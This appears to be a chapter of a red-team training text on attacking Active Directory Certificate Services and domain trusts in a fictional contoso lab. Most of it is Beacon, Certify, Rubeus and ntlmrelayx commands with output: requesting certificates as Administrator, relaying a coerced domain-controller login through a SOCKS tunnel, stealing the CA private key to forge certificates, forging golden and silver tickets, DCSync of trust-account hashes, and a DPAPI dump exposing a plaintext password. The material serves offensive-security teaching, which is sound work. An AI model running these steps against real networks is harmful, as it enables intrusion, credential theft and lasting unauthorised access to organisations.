[*] Action: User DPAPI Credential Triage

[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

[*] User master key cache:

{120b3a8a-683d-4db8-8f13-e4c466949bd2}:62DD49BC2CF3000FC9DF3E3B6B48CA732D77FB34

[*] Triaging Credentials for ALL users

Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    LastWritten      : 14/02/2025 14:02:28
    TargetName       : Domain:target=TERMSRV/lon-ws-1
    TargetAlias      : 
    Comment          : 
    UserName         : LON-WS-1\Administrator
    Credential       : Passw0rd!

15.16 Active Directory Certificate Services

Active Directory Certificate Services (ADCS) is a Windows role for issuing and managing PKI certificates. It integrates with AD DS to provide secure email, smart-card logon, network authentication (802.1X, EAP-TLS), and code signing.

This chapter covers common ADCS misconfigurations for privilege escalation and persistence, based on the 2021 Certified Pre-Owned paper. Focus is on user authentication abuse. Summary of the techniques covered:

IDMisconfigurationSection
ESC1Client Authentication EKU + ENROLLEE_SUPPLIES_SUBJECT§15.17
ESC3Certificate Request Agent EKU available to low-priv users§15.18
ESC2Any Purpose / blank EKU§15.19
ESC4Permissive ACE on a template — modify it into ESC1/ESC3§15.20
ESC8HTTP web enrolment without Channel Binding (NTLM relay)§15.21
DPERSIST1Forge certificates offline with the CA private key§15.22

15.16.1 X.509

An X.509 certificate, issued by a Certificate Authority (CA) to represent a domain principal (user or computer), typically contains:

  • Subject — the principal the certificate represents (CN, OU, etc.)
  • Subject Alternative Name (SAN) — additional identities the certificate is valid for
  • Issuer — the CA that issued the certificate
  • Public key — the principal's public key
  • Validity period — NotBefore and NotAfter timestamps
  • Extended Key Usages (EKUs) — purposes the certificate may be used for (client auth, code signing, etc.)
  • Issuer signature — the CA's signature over the certificate contents

15.16.2 Certificate Templates

Certificate templates pre-configure issuance rules — EKUs, validity period, subject construction, enrolment ACL, and approval requirements. The default User template covers secure email, EFS, and client authentication. Key abuse-relevant properties:

  • Validity period — a long validity period extends the abuse window after issuance. Certificates are valid until they expire or are explicitly revoked.
  • EKUs — referenced as OIDs; Any Purpose and missing EKUs are easier to abuse than scoped ones. Common OIDs: 1.3.6.1.5.5.7.3.2 (Client Authentication), 1.3.6.1.5.5.7.3.4 (Secure Email), 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon), 2.5.29.37.0 (Any Purpose).
  • Security DACL — controls which principals can read, modify, or enrol for the template. Overly permissive ACEs allow low-privileged users to modify a template or enrol for one that authenticates as a higher-privileged principal.
  • Manager approval — when disabled, certificate requests are issued without manual review.
  • Subject source — Build from this Active Directory information ties the subject to the requestor; Supply in the request lets the requestor specify any subject, including another user — the ESC1 primitive.

15.16.3 Enumeration

Certify is the standard ADCS enumeration tool. enum-cas returns information about CAs and sub-CAs in the domain:

15.17 Misconfigured 'Client Authentication' Templates

ESC1 occurs when an attacker can enrol for a certificate template that (a) has an EKU enabling client authentication and (b) allows the subject to be supplied by the requestor:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=contoso,DC=com'
[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
[*] Listing info about the enterprise certificate authority 'CONTOSO Root CA'

    [...snip...]

[*] Certificate templates found using the current filter parameters:

    Template Name                         : ESC1
    Enabled                               : True
    Publishing CAs                        : lon-cs-1.contoso.com\CONTOSO Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Client Authentication
    Certificate Application Policies      : Client Authentication
    Vulnerabilities
      ESC1                                : The template has a client authentication EKU and allows enrollees to supply subject.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
      Object Control Permissions

The output flags three exploitable conditions: the Client Authentication EKU is enabled, ENROLLEE_SUPPLIES_SUBJECT is set, and Domain Users have enrolment rights. Exploit with Certify's request:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet

[*] Action: Request a certificate

[*] No subject name specified, using current context as subject.

[*] Subject Alt Name(s)     : Administrator
[*] Certificate Authority   : lon-cs-1.contoso.com\CONTOSO Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 3

[*] Certificate (PFX)       :

MIACAQ[...snip...]AAAAA=

Certify completed in 00:00:20.3128203

The output is a base64-encoded PFX certificate usable with Rubeus' asktgt:

15.18 Misconfigured 'Certificate Request Agent' Templates

ESC3 occurs when an attacker can enrol for a certificate that has the Certificate Request Agent EKU enabled. Such certificates can sign requests on behalf of other users — enabling impersonation:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

    Template Name                         : ESC3
    Enabled                               : True
    Publishing CAs                        : lon-cs-1.contoso.com\CONTOSO Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Certificate Request Agent
    Certificate Application Policies      : Certificate Request Agent
    Vulnerabilities
      ESC3                                : The template has the 'Certificate Request Agent' EKU.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513

The output shows the Certificate Request Agent EKU is enabled, Domain Users have enrolment rights, and no manager approval or authorisation signatures are required. Exploitation is a two-step process. First, request a certificate from this template using the current user context:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
[*] Action: Request a certificate
[*] Current user context    : CONTOSO\pchilds
[*] Template                : ESC3
[*] Subject                 : CN=Polly Childs, CN=Users, DC=contoso, DC=com
[*] Certificate Authority   : lon-cs-1.contoso.com\CONTOSO Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 3
[*] Certificate (PFX)       : MIACAQ[...snip...]AAAAA=

Then use that certificate to request a second certificate on behalf of another user. The default User template is a good target — it has the Client Authentication EKU enabled:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
[*] Action: Request a certificate (on behalf of another user)
[*] Current user context    : CONTOSO\pchilds
[*] Template                : User
[*] On Behalf Of            : Administrator
[*] Certificate Authority   : lon-cs-1.contoso.com\CONTOSO Root CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 4
[*] Certificate (PFX)       : MIACAQ[...snip...]AAAAAA

15.19 Misconfigured 'Any Purpose' Templates

ESC2 occurs when an attacker can enrol for a certificate with either the Any Purpose EKU or blank/empty EKUs (treated as Subordinate CA). The resulting certificate substitutes for any EKU without restriction:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

    Template Name                         : ESC2
    Enabled                               : True
    Publishing CAs                        : lon-cs-1.contoso.com\CONTOSO Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : SUBJECT_REQUIRE_DIRECTORY_PATH
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Any Purpose
    Certificate Application Policies      : Any Purpose
    Vulnerabilities
      ESC2                                : The template has the 'Any Purpose' EKU.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513

Since the certificate works for any purpose, the ESC3 abuse pattern applies. If ENROLLEE_SUPPLIES_SUBJECT is also enabled, the ESC1 abuse pattern applies instead.

15.20 Certificate Template Access Control

ESC4 occurs when a low-privilege principal holds a permissive ACE on a template, letting them modify the template into an exploitable state. Relevant rights: Owner, FullControl, WriteOwner, WriteDacl, WriteProperty. Example template flagged by Certify:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

    Template Name                         : ESC4
    Enabled                               : True
    Publishing CAs                        : lon-cs-1.contoso.com\CONTOSO Root CA
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
    Vulnerabilities
      ESC4                                : The template has insecure delegated permissions.
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
      Object Control Permissions
        Write Owner                 : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
        Write Dacl                  : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513
        Write Property              : CONTOSO\Domain Users               S-1-5-21-3926355307-1661546229-813047887-513

Certify's manage-template can toggle EKUs, add or remove certificate name flags (including ENROLLEE_SUPPLIES_SUBJECT), modify enrolment ACEs, and disable manager approval. The example template already has the Client Authentication EKU, so adding ENROLLEE_SUPPLIES_SUBJECT reduces this to ESC1:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
[*] Action: Manage a certificate template
[*] Using the search base 'CN=Configuration,DC=contoso,DC=com'
[*] Attempting to toggle certificate name flags on the certificate template.
[*] Successfully modified the certificate template.

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --template ESC4 --quiet
[...snip...]
Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT

15.21 NTLM Relay to ADCS HTTP Endpoints

The IIS-based web enrolment endpoint (typically http[s]://<ca>/certsrv/) accepts certificate requests via browser UI. Without HTTPS plus Extended Protection for Authentication (Channel Binding), it's vulnerable to NTLM relay — capture authentication, relay it to the endpoint, and enrol certificates as the captured principal.

Certify's enum-cas returns the URL and reports ESC8 status:

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

    Enterprise CA Name            : CONTOSO Root CA
    DNS Hostname                  : lon-cs-1.contoso.com
    FullName                      : lon-cs-1.contoso.com\CONTOSO Root CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=CONTOSO Root CA, DC=contoso, DC=com
    Cert Thumbprint               : 73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
    Cert Serial                   : 11138CE7C4FC0C9B4F805AC184522B2C
    Cert Start Date               : 30/08/2025 12:19:40
    Cert End Date                 : 30/08/2125 12:29:39
    Cert Chain                    : CN=CONTOSORootCA,DC=contoso,DC=com
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    Vulnerabilities
      ESC8                        : The CA supports HTTP web enrollment without channel binding.
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544
      
    Legacy ASP Enrollment Website : http://lon-cs-1.contoso.com/certsrv/

Relaying through C2 is harder than from a Kali VM on the local LAN — port 445 on Windows is already bound, and neither Windows nor Beacon runs popular relay tooling like ntlmrelayx natively. The end-to-end setup:

  1. Unbind port 445 on the compromised host
  2. Reverse-port-forward 445 back to a relay running on the operator side
  3. Start a SOCKS proxy that the relay can use to reach the ADCS endpoint
  4. Run ntlmrelayx on the operator side, tunnelled through that SOCKS
  5. Coerce authentication from a high-value principal (e.g. a DC) to the unbound port

As Nick Powers documented, port 445 is bound by the srvnet.sys driver, run by a service of the same name. Other services depend on it — stop lanmanserver, srv2, then srvnet in that order. Confirm port 445 is bound first (PID 4 is the kernel):

beacon> netstat

PROTO   SRC            DST       STATE        PROCESS    PID
TCP     0.0.0.0:445    LISTEN    LISTENING               (    4)

lanmanserver auto-restarts because its start type is AUTO_START (srv2 and srvnet are DEMAND_START). Reconfigure it to disabled first:

beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
config_service:
  hostname:    
  servicename: lanmanserver
  binpath:     C:\Windows\system32\svchost.exe -k netsvcs -p
  ignoremode:  1
  startmode:   4
SUCCESS.

Then stop each service:

beacon> sc_stop lanmanserver
stop_service:
  hostname:    
  servicename: lanmanserver
SUCCESS.

beacon> sc_stop srv2
stop_service:
  hostname:    
  servicename: srv2
SUCCESS.

beacon> sc_stop srvnet
stop_service:
  hostname:    
  servicename: srvnet
SUCCESS.

Re-run netstat to confirm port 445 is no longer listening. With 445 unbound, set up the reverse port forward. Beacon offers two commands:

  • rportfwd — forwards through the team server
  • rportfwd_local — forwards to the CS client's loopback address

This setup runs ntlmrelayx inside a Docker container on the operator desktop, with port 7445 exposed on the host mapping to port 445 inside the container — so use rportfwd_local to forward to localhost:7445:

beacon> rportfwd_local 445 localhost 7445
[+] started reverse port forward on 445 to neo -> localhost:7445

netstat now shows port 445 listening again, but bound to the Beacon process rather than the kernel:

beacon> netstat

PROTO   SRC            DST       STATE        PROCESS                            PID
TCP     0.0.0.0:445    LISTEN    LISTENING    C:\Windows\System32\svchost.exe    ( 3452)

Start a SOCKS proxy for ntlmrelayx to reach the ADCS endpoint:

beacon> socks 1080 socks5
[+] started SOCKS5 server on: 1080

Run ntlmrelayx inside the Kali Docker container:

PS C:\Users\Attacker> docker container start -i kali-1
┌──(root㉿fe0bcf4000ca)-[/]
└─# proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections

The setup uses the coerced authentication technique from the S4U2self section to relay a DC's credentials — that's why the request targets the DomainController template. With ntlmrelayx waiting, trigger the DC's auth from Beacon:

beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108

The DC's NTLM authentication request tunnels down to ntlmrelayx, which relays it back up through the SOCKS proxy to the ADCS endpoint. The issued certificate is saved locally as a PFX:

[*] (SMB): Received connection from 172.17.0.1, attacking target http://10.10.120.5
|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.5:80-<><>-OK

|S-chain|-<>-10.0.0.5:1080-<><>-10.10.120.5:80-<><>-OK
[*] http://CONTOSO/LON-DC-1$@10.10.120.5 [1] -> Generating CSR...
[*] http://CONTOSO/LON-DC-1$@10.10.120.5 [1] -> CSR generated!

[*] http://CONTOSO/LON-DC-1$@10.10.120.5 [1] -> Certificate successfully written to file

The certificate grants a TGT for the DC, which can then be used in S4U2self to obtain usable service tickets impersonating any user — including domain admins.

15.22 Golden Certificates

DPERSIST1 — compromise the CA, extract its private key, and use it to forge and sign certificates offline. The AD CS equivalent of a golden ticket; because the CA key never rotates, access is indefinite.

This is framed as persistence on the assumption that the CA is a Tier 0 asset (same privilege tier as DCs). If the CA was reached via a separate path first, this doubles as privilege escalation.

With a Beacon on the CA, dump the keypair in PFX format via Certify:

beacon> run hostname
lon-cs-1

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
[*] Action: Manage the current machine
[*] Attempting to dump a certificate from the certificate store.
[*] Certificate (PFX) - CONTOSO Root CA:

MIACAQ[...snip...]AAAAA=

Decode the base64 PFX and save it locally for offline forging:

PS C:\Users\Attacker> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx", [Convert]::FromBase64String("MIACAQ[...snip...]AAAAA="))

Forge a certificate for the default Domain Administrator:

PS C:\Users\Attacker> C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\contoso-root-ca.pfx --quiet --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
[*] Action: Forge a (golden) certificate

CA Certificate Information:
  Subject:        CN=CONTOSO Root CA, DC=contoso, DC=com
  Issuer:         CN=CONTOSO Root CA, DC=contoso, DC=com
  Start Date:     8/30/2025 11:19:40 AM
  End Date:       8/30/2125 11:29:39 AM
  Thumbprint:     73B4B551DB60427D0CBD5D2E2658BCB2088F3F2C
  Serial:         11138CE7C4FC0C9B4F805AC184522B2C

Forged Certificate Information:
  Subject:        DC=com, DC=contoso, CN=Users, CN=Administrator
  SubjectAltName: Administrator
  Issuer:         CN=CONTOSO Root CA, DC=contoso, DC=com
  Start Date:     2/28/2026 2:33:47 PM
  End Date:       2/28/2027 2:33:47 PM
  Thumbprint:     EBE370DFB276BEEB209D690EEC38DC6F36181638
  Serial:         6277C3E922A4E8DA7B0653FA05E9BA5F

Forged certificate (PFX):

MIACAQ[...snip...]AAAA==

The forged certificate is then usable with Rubeus' asktgt to obtain TGTs for the target user. It remains valid up to its End Date unless manually revoked — set a long validity period for long-term persistence.

15.23 Forest & Domain Trusts

AD environments often span multiple domains and forests connected via trust relationships. A trust allows principals in one domain or forest to authenticate to resources in another. Common types:

Trust typeScopeTransitive?
Parent-childWithin a forest, between parent and child domainsYes
Tree-rootWithin a forest, between tree rootsYes
ForestBetween forest rootsYes
ExternalBetween domains in different forestsNo
ShortcutWithin a forest, between non-adjacent domainsYes

15.23.1 Transitivity

Transitivity determines whether a trust extends beyond its two parties. If A↔B and B↔C and both trusts are transitive, A implicitly trusts C. Intra-forest trusts are transitive by default; external trusts are not.

15.23.2 Trust Direction

Trust direction controls which domain can access the other's resources. A one-way trust (A→B) lets users in A access resources in B but not vice versa; a two-way trust permits both. Trust direction is the opposite of the access direction — the trusting domain grants access to principals from the trusted domain. One-way trusts are inbound or outbound depending on perspective.

15.23.3 Trusted Domain Objects

Each trust is stored as a Trusted Domain Object (TDO), holding the trust type, transitivity, and shared inter-realm key. The PDC rotates this key every 30 days. Query via the trustedDomain object class:

beacon> ldapsearch (objectClass=trustedDomain)

Key TDO attributes:

  • trustPartner — the trusted domain's DNS name
  • trustType — Windows (2), MIT Kerberos (3), Distributed Computing Environment (4)
  • trustDirection — 1 (inbound), 2 (outbound), 3 (bidirectional)
  • trustAttributes — flags including transitivity, forest trust, treat-as-external
  • securityIdentifier — the trusted domain's SID, used for SID filtering

15.23.4 Security Boundaries

A security boundary defines the scope of administrative authority. In AD, domain admins can escalate to enterprise admin, so the forest — not the domain — is the true security boundary. Domain admins in one domain within a forest cannot be reliably prevented from accessing others in the same forest, which is what makes child-to-root escalation possible.

15.24 Inter-Realm Tickets

In same-realm Kerberos, a principal's TGT is used to request service tickets from the same KDC. Cross-realm requests require an inter-realm key — a TGT issued in one realm can't be decrypted by another (different krbtgt secrets).

To access a service in a trusting realm, the client sends a TGS-REQ to its own KDC, including its trusted-realm TGT, with the realm field set to the trusted realm and the sname field set to the target service's SPN.

When a service in a foreign realm is requested, the local KDC returns an inter-realm TGT — a TGT encrypted with the shared inter-realm key rather than krbtgt. The client presents this to the foreign KDC to obtain the actual service ticket.

The returned inter-realm TGT has its realm field set to the trusted realm but its SPN set to the krbtgt service of the trusting realm. The client presents it directly to the foreign KDC in a follow-up TGS-REQ; the foreign KDC decrypts with its copy of the inter-realm key and returns the actual service ticket.

15.24.1 Trust accounts

After trust creation, the trusting realm's TGS account is registered in the trusted realm's KDC using the flat (NetBIOS) name — e.g. PARTNER$ appears under CN=Users in contoso.com. ADUC hides these accounts; find them by filtering on samAccountType=SAM_TRUST_ACCOUNT:

beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName

Binding to 10.10.120.1

[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (samAccountType=805306370)
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName

--------------------
sAMAccountName: PARTNER$

The inter-realm key is the trust account password — the trusted domain uses it to encrypt inter-realm TGTs; the trusting domain stores the shared key in the TDO.

15.25 Parent/Child Trusts

Parent/child trusts are two-way and transitive. Every child domain has an implicit two-way trust with the tree root regardless of depth, so compromising a child domain DA escalates to the forest. Querying the TDO confirms a bidirectional trust with contoso.com:

beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 3
trustAttributes: 32
flatName: CONTOSO

Compromising any child domain allows escalation to enterprise admin. Forge a golden ticket with SID History containing the parent domain's Enterprise Admins SID — the KDC adds those group memberships to the PAC, granting forest-wide privileges.

This ticket can be crafted entirely offline:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com

Binding to lon-dc-1.contoso.com

[*] Distinguished name: DC=contoso,DC=com
[*] Filter: (objectClass=domain)
[*] Scope of search value: 1
[*] Returning specific attribute(s): objectSid

--------------------
objectSid: S-1-5-21-3926355307-1661546229-813047887
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com

Binding to lon-dc-1.contoso.com

[*] Distinguished name: DC=contoso,DC=com
[*] Filter: (objectClass=domain)
[*] Scope of search value: 1
[*] Returning specific attribute(s): objectSid

--------------------
objectSid: S-1-5-21-3926355307-1661546229-813047887

Or it can be created using the diamond technique:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap

Injecting the ticket grants access to the forest root DC:

beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent

          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/03/2025 13:38:06   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows

 1gb      fil     03/13/2025 05:44:35   pagefile.sys

15.26 Inbound Trusts

A one-way trust is created when administrators want to share resources with a trusted domain without exposing their own resources to the trusting side — common for one-way migrations or data transfers. The TDO below shows an inbound transitive forest trust with partner.com:

beacon> getuid
[*] You are CONTOSO\pchilds

beacon> ldapsearch (objectClass=trustedDomain)

name: partner.com
trustDirection: 1
trustAttributes: 8
flatName: PARTNER

From the trusted domain, find principals with legitimate access to trusting domain resources and impersonate them. SID History in golden tickets doesn't work across external trusts — SID filtering causes the trusting domain to discard any SIDs not native to itself.

The Foreign Security Principals container holds foreignSecurityPrincipal objects representing principals from trusted domains — these can be members of groups in the trusting domain. Enumerate this container across the inbound trust.

beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com

Binding to partner.com

[*] Distinguished name: DC=partner,DC=com
[*] Filter: (objectClass=foreignSecurityPrincipal)
[*] Scope of search value: 3
[*] Returning specific attribute(s): cn,memberOf

--------------------
cn: S-1-5-4
--------------------
cn: S-1-5-11
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=partner,DC=com, CN=Users,CN=Builtin,DC=partner,DC=com
--------------------
cn: S-1-5-17
--------------------
cn: S-1-5-9
--------------------
cn: S-1-5-21-3926355307-1661546229-813047887-6102
memberOf: CN=Contoso Users,CN=Users,DC=partner,DC=com
retreived 5 results total

Default FSP entries (S-1-5-4, S-1-5-9, S-1-5-11, S-1-5-17) are noise — ignore them. Any other SID indicates a trusted-domain principal with access. Query by SID to resolve the object.

beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)

--------------------
objectClass: top, group
cn: Partner Jump Users
member: CN=Polly Childs,CN=Users,DC=contoso,DC=com
distinguishedName: CN=Partner Jump Users,CN=Users,DC=contoso,DC=com
name: Partner Jump Users
objectSid: S-1-5-21-3926355307-1661546229-813047887-6102
sAMAccountName: Partner Jump Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=contoso,DC=com

Foreign domain groups are nested into local groups to assign privileges. Enumerate these via GPOs or local group membership on machines in the trusting domain. From the trusted side, you can enumerate the foreign domain freely.

beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com

Binding to partner.com

[*] Distinguished name: DC=partner,DC=com
[*] Filter: (samAccountType=805306369)
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName

--------------------
sAMAccountName: PAR-DC-1$
--------------------
sAMAccountName: PAR-JMP-1$
retreived 2 results total

Enumerate manually or feed the data into BloodHound via BOFHound. Alternative compromise paths include roastable accounts and vulnerable services in the foreign domain.

15.26.1 Forging referral tickets

With eligible credentials, impersonate the principal and let Windows handle ticket requests. Alternatively, forge inter-realm referral tickets manually using the inter-realm key — obtainable by dumping the trust account credentials from the trusted domain.

beacon> dcsync contoso.com CONTOSO\PARTNER$

Credentials:
  Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
    ntlm- 0: 6150491cceb080dffeaaec5e60d8f58d
    lm  - 0: a1542b43120fba746668d676b8e25f40

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgtPARTNER
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 48ceeb9986c09692d2200d6b8d4ba8ff0152a49a3507bee92bfc62281fa756fa
      aes128_hmac       (4096) : 7d6b3d1ace90c769bcaab80eaa8da70d
      des_cbc_md5       (4096) : 5d5e67259270abc4

Use the hashes with Rubeus' silver command. Trusts still default to RC4 encryption even on modern Windows, so the NTLM hash is the relevant key:

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
